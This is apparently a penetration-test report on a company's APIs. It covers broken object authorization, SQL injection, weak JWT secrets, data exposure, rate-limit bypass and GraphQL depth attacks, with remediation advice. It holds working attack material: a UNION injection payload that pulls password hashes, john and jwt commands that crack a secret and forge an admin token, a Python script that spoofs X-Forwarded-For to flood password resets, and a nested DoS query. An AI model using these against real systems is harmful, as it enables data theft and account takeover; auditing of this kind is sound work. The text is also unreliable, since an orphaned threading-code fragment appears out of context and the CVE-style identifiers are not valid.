## Critical Vulnerabilities (CVSS 9.0-10.0)

### CVE-2023-API-001: Broken Object Level Authorization
**API Endpoint:** `GET /api/v2/users/{userId}/profile`  
**CVSS Score:** 9.1 (Critical)  
**CWE:** CWE-639 - Authorization Bypass Through User-Controlled Key  
**Impact:** Complete user data exposure across the platform

**Vulnerability Details:**
The user profile API endpoint fails to validate that the requesting user has permission to access the specified user ID, allowing any authenticated user to retrieve any other user's profile information.

**Proof of Concept:**
```http
# Legitimate request
GET /api/v2/users/12345/profile HTTP/1.1
Host: api.company.com
Authorization: Bearer <valid_jwt_for_user_12345>

# Malicious request - accessing another user's data
GET /api/v2/users/67890/profile HTTP/1.1
Host: api.company.com  
Authorization: Bearer <valid_jwt_for_user_12345>

Response:
{
  "userId": 67890,
  "email": "victim@email.com",
  "personalData": {
    "ssn": "123-45-6789",
    "phone": "+1-555-0123",
    "address": "123 Private St, City, State"
  }
}
```

**Business Impact:**
- Complete customer PII database accessible to any authenticated user
- GDPR Article 32 violation - security of processing breach
- Potential for identity theft and fraud
- Customer trust and reputation damage

**Remediation:**
**Priority:** Immediate (0-7 days)
1. Implement server-side authorization check
2. Validate requesting user has permission for target user ID
3. Add audit logging for profile access attempts
4. Implement rate limiting on profile endpoints

**Recommended Fix:**
```python
def get_user_profile(current_user_id, target_user_id):
    # Check if current user can access target user's profile
    if current_user_id != target_user_id:
        if not has_admin_permission(current_user_id):
            raise UnauthorizedError("Access denied")
    
    return get_profile_data(target_user_id)
```

### CVE-2023-API-002: SQL Injection in Search API
**API Endpoint:** `GET /api/v1/search?query={searchTerm}`  
**CVSS Score:** 9.8 (Critical)  
**CWE:** CWE-89 - SQL Injection  
**Impact:** Complete database compromise and data exfiltration

**Vulnerability Details:**
The search API directly concatenates user input into SQL queries without proper sanitization or parameterization, allowing for SQL injection attacks.

**Proof of Concept:**
```http
GET /api/v1/search?query=product' UNION SELECT user_id,password_hash,email FROM users-- HTTP/1.1
Host: api.company.com
Authorization: Bearer <valid_token>

Response:
{
  "results": [
    {
      "user_id": 1001,
      "password_hash": "$2b$12$...",
      "email": "admin@company.com"
    }
  ]
}
```

**Attack Scenarios:**
- Database schema enumeration
- Sensitive data extraction (passwords, PII, financial data)
- Administrative account compromise
- Database server compromise via `xp_cmdshell` or similar

**Remediation:**
**Priority:** Emergency (0-24 hours)
1. Immediately disable vulnerable endpoint
2. Implement parameterized queries
3. Add input validation and sanitization
4. Deploy web application firewall rules
5. Conduct full security audit of database

## High Vulnerabilities (CVSS 7.0-8.9)

### API-H-001: Broken Authentication - JWT Secret Brute Force
**API Endpoint:** All JWT-authenticated endpoints  
**CVSS Score:** 8.2 (High)  
**CWE:** CWE-521 - Weak Password Requirements

**Vulnerability Details:**
JWT tokens are signed with a weak secret key that can be brute-forced, allowing attackers to forge arbitrary tokens with any user ID and permissions.

**Discovery Process:**
1. Captured legitimate JWT token from API response
2. Analyzed token structure and identified HS256 algorithm
3. Performed dictionary attack against signing secret
4. Successfully cracked secret: "password123"
5. Generated administrative token with elevated permissions

**Proof of Concept:**
```bash
# Extract JWT from API response
jwt_token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# Crack JWT secret using john the ripper
john --wordlist=rockyou.txt jwt_hash.txt
# Result: password123

# Generate administrative token
jwt encode --secret="password123" '{"sub":"admin","role":"administrator","exp":9999999999}'
```

**Impact:**
- Complete authentication bypass
- Privilege escalation to administrative levels
- Account takeover of any user
- System-wide compromise potential

### API-H-002: Excessive Data Exposure in User Lists
**API Endpoint:** `GET /api/v2/users`  
**CVSS Score:** 7.5 (High)  
**CWE:** CWE-200 - Information Exposure

**Vulnerability Details:**
The user list API returns full user objects including sensitive information such as email addresses, phone numbers, and internal IDs, even for low-privileged requests.

**Proof of Concept:**
```http
GET /api/v2/users?page=1&limit=100 HTTP/1.1
Host: api.company.com
Authorization: Bearer <low_privilege_token>

Response:
{
  "users": [
    {
      "id": 12345,
      "username": "jdoe",
      "email": "john.doe@email.com",
      "phone": "+1-555-0123",
      "internal_id": "EMP-2023-001",
      "created_at": "2023-01-15T10:30:00Z",
      "last_login": "2023-10-01T14:22:31Z"
    }
  ]
}
```

**Business Impact:**
- User enumeration for targeted attacks
- Email harvesting for phishing campaigns
- Privacy regulation violations
- Competitive intelligence exposure

## Medium Vulnerabilities (CVSS 4.0-6.9)

### API-M-001: Rate Limiting Bypass
**API Endpoint:** `/api/v1/password-reset`  
**CVSS Score:** 6.5 (Medium)  
**CWE:** CWE-799 - Improper Control of Interaction Frequency

**Vulnerability Details:**
Rate limiting can be bypassed using multiple techniques including header manipulation and distributed requests, enabling brute force and denial of service attacks.

**Bypass Techniques Tested:**
1. **X-Forwarded-For Header Manipulation**
2. **User-Agent Rotation**
3. **Distributed Source IPs** 
4. **Case Variation in HTTP Methods**

**Proof of Concept:**
```python
import requests
import time

def bypass_rate_limit():
    headers_list = [
        {"X-Forwarded-For": "192.168.1.1"},
        {"X-Forwarded-For": "10.0.0.1"},
        {"X-Forwarded-For": "172.16.0.1"}
    ]
    
    for i in range(1000):
        headers = headers_list[i % len(headers_list)]
        response = requests.post(
            "https://api.company.com/api/v1/password-reset",
            json={"email": "target@email.com"},
            headers=headers
        )
        print(f"Request {i}: {response.status_code}")
```

### API-M-002: GraphQL Query Depth Attack
**API Endpoint:** `POST /graphql`  
**CVSS Score:** 6.1 (Medium)  
**CWE:** CWE-770 - Allocation of Resources Without Limits or Throttling

**Vulnerability Details:**
GraphQL endpoint lacks query depth limiting, allowing deeply nested queries that can cause excessive resource consumption and potential DoS conditions.

**Proof of Concept:**
```graphql
query DeeplyNestedQuery {
  user(id: 1) {
    posts {
      comments {
        replies {
          user {
            posts {
              comments {
                replies {
                  user {
                    posts {
                      comments {
                        content
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()
```

## Data Privacy and Protection Analysis

### GDPR Compliance Assessment
**Article 25 - Data Protection by Design:**
- ❌ APIs return more data than necessary for the functionality
- ❌ No data minimization in API responses
- ❌ Missing privacy controls in user profile APIs
